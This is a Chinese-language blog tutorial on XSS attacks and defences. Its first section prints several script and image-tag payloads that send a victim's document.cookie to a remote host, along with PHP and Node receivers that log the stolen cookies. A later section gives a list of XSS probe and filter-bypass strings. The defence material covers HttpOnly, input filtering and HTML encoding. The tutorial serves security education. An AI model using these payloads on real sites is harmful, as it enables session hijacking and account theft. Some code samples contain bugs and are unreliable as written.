---
title: web安全-浅谈xss攻防（二）
date: 2018-10-10 16:05:13
cover: "https://cdn.jsdelivr.net/gh/okaychen/CDN@1.2/BlogSource/gallery/thumb_007.jpg"
tags:  
    - WEB安全
categories:
    - WEB安全
---

# 前言
上次介绍了什么是XSS以及XSS的三种类型，作为上次小尾巴的总结来说：XSS跨站脚本是一种经常出现在web应用程序中的计算机安全漏洞，是由于web应用程序对于用户的输入过滤不足引起的。攻击者利用网站漏洞把恶意脚本代码注入到网页之中，当其他用户浏览这些网页时，就会执行其中的恶意代码，轻者能达到恶作剧的目的，重者可以对受害者采取cookie资料窃取，会话劫持，钓鱼欺骗等各种攻击；分为三种类型，服务端的存储型和反射性，客户端自身漏洞引起的DOM型。这次我简单总结一些常见的攻击对应的防御措施，方便以后学习回顾;
<!--more-->
# 1.Cookie劫持
下面是几种是窃取用户Cookie信息的恶意代码，攻击者向漏洞页面写入类似的恶意代码从而达到获取客户端cookie信息的目的:

```
<script>document.location="http://test.com/cookie.asp?cookie ='+document.cookie</script>
<img src="http://test.com/cookie.asp?cookie ='+document.cookie">
<script>new Image().src="http://test.com/cookie.asp?cookie ='+document.cookie"</script>
<script>img=new Image();img.src="http://test.com/cookie.asp?cookie ='+document.cookie";img.wdith=0;img.height=0;</script>
<script>document.write('<img src="http://test.com/cookie.asp?cookie ='+document.cookie" width=0 height=0 border=0>')</script>
```
诸如此类，一旦注入成功，这些恶意代码都会向某个特定的远程服务器提交cookie，攻击者会在远程服务器上写一个接收和记录cookie信息的文件
例如php版本：
```php
<?php
    $cookie=$_GET['cookie'];
    $log= fopen("cookie.txt","a");
    fwrite($log,$cookie ."\n");
    fclose($log);
?>
```
或者node来处理:
```js
const http = require('http');
const fs = require('fs');

http.createServer(function(req,res){
    var Cookies = {};
    
    req.headers.cookie && req.headers.cookie.split(';').foEach(function(Cookies){
        var parts = Cookie.split('=');
        Cookies[ parts[ 0 ].trim() ] = ( parts[ 1 ] || '' ).trim();
    })

    console.log(Cookies)

    res.writeHeader(200,{
        'Set-Cookie' : 'SSID=EqAc1D; Expires=Wed', 
        // 注意上面我们不设置HttpOnly;Fix:>>>'SSID=EqAc1D; Expires=Wed;HttpOnly'<<<
		'Content-Type' : 'text/plain'
    });
    
    fs.open('cookie.txt','r+',function(err,fd){
        if(err){
            return console.error(err);
        }
        fs.writeFile(fd,Cookies,function(){
            if(err){
                return console.error(err);
            }
        })
    })
}).listen(8000);
```
亦或是jsp版本、python flask等等诸如此类可以获取到从客户端发来的cookie做接收和记录操作的。

获取到存储信息的cookie.txt后，攻击者就可以通过修改网站的cookie信息（f12打开开发者控制工具，application/Cookies）来登入网站，从而来进行进一步的攻击操作。

## 防止cookie会话劫持
根本原因是攻击者获取cookie的恶意js代码注入到站点，进一步传到攻击者的远程服务器，从而进行攻击操作；
对于可能的意外注入站点的获取cookie的恶意js代码，我们一般要在设置cookie时加HttpOnly，来禁止意外注入站点的恶意js代码操作Cookie造成xss攻击
比如node设置HttpOnly：
```js
'Set-Cookie' : 'SSID=EqAc1D; Expires=Wed ;HttpOnly'
```
或者php设置HttpOnly：
```php
<?php ini_set("session.cookie_httponly", 1); ?>
```
# 2.提高攻击门槛

## 使用XSS Filter
针对用户提交的数据进行有效的验证，只接受我们规定的长度或内容的提交，过滤掉其他的输入内容，例如：
1.表单数据指定值的类型：年龄只能是 int 、name 只能是字母数字等
2.过滤或移除特殊的 html 标签：`<script>`、`<iframe>`等
3.过滤 js 事件的标签：onclick、onerror、onfocus等
4.对于要求用户输入的一些特殊格式的字段，用正则和字段长度进行严格限制，比如手机号，邮箱等
如在客户端进行验证手机号的JavaScript代码:
```js
<form id="test">
    <input type="text" id="tel">
    <input type="button" onclick="checkTel()"> 
</form>
<script>
    function(){
        let re = /^020-\d{8}$/;
        if(re.test(document.getElementById("Tel").value)){
            alert('电话号码格式正确');
        }else{
            alert('错误的电话号码');
        }
    }
</script>
```
这段JavaScript验证代码要求用户输入的必须是020-开头，后跟8位数字.
> 但是需要特别注意的是，*仅仅在客户端进行非法输入的验证和检测是远远不够的*，因为客户端组件和用户输入不在服务器的控制范围内，用户能够完全控制客户端及提交的数据，比如firebug、TemperDate之类的工具，拦截应用程序收到和发布每一个HTTP/HTTPS请求和响应，对其进行修改和检查，从而绕过客户端的检验将信息提交到服务器中。因此，确认客户端生成数据的唯一安全方法就是在服务端实施保护措施。

## 输出编码Xss Escape
有时候我们又不可避免的需要用户输入一些特殊字符，但是我们又不确定用户输入的这段含特殊字符的数据是不是恶意的含xss的字符，为了保证用户输入的完整性和正确性，就可以使用编码（HTMLEncode）进行处理。

HTML编码在防止xss攻击上能起很大的作用，它主要使用对应的实体代替HTML字符，让该字符作为其HTML文档的内容而非结构加以处理。

| 显示 | 实体名字 | 实体编号 |
| :------: | :------: | :------: |
| `<` | `&lt;` | `&#60;` |
| `>` | `&gt;` | `&#62;` |
| `&` | `&amp;` | `&#38;` |
| `"` | `&quot;` | `&#34;` |

上面就是几个可能触发xss的敏感字符，都是一些特殊的HTML字符。都这些字符实现编码和转义后，能够有效地防范HTML注入和XSS攻击

例如php的`htmlspecialchars()`库函数，就能够将用户输入的特殊字符进行实体转换：
- `<` 转成 `&lt;`
- `>` 转成 `&gt;`
- `&` 转成 `&amp;`
- `"` 转成 `&quot;`
- `'` 转成 `&#39;`

实际情况中，我们可以结合这两种情况进行过滤
![安全的过滤形式](/assets/images/xss-encode02.png)

# 3.Xss漏洞检测Poc
标准的xss漏洞检测代码
```js
<script>alert('xss')</script>
```
img 图片标记属性跨站攻击代码
```
<img src="javascript:alert(/xss/)"></img> <img dynsrc="javascript:alert('xss')">
```
无需 “<>”，利用 html 标记事件属性跨站
```
<img src="" onerror=alert("xss")>
```
空格与回车符转换
```
<img src="Jav&#x09;ascript:alert('xss')"> <img src="Jav&#x0A;ascript:alert('xss')"> <img src="Jav&#x0D;ascript:alert('xss')">
```
10 进制转换
```
<img src="&#74&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#39&#120&#115&#115&#39&#41">
```
以上代码都可以做 Poc 使用，在有变量的位置插入，如果成功执行则代表有漏洞。
只要你提交的Poc，服务端原封不动的返回了，说明服务端不经过任何处理就显示了，就证明有漏洞存在。

# 参考资料
[《XSS跨站脚本剖析与防御》--邱永华](https://book.douban.com/subject/25711796/)
[《白帽子讲web安全》--吴翰清](https://book.douban.com/subject/10546925/)
[《Web 安全：前端攻击 XSS 深入解析》](https://blog.csdn.net/gitchat/article/details/78726803)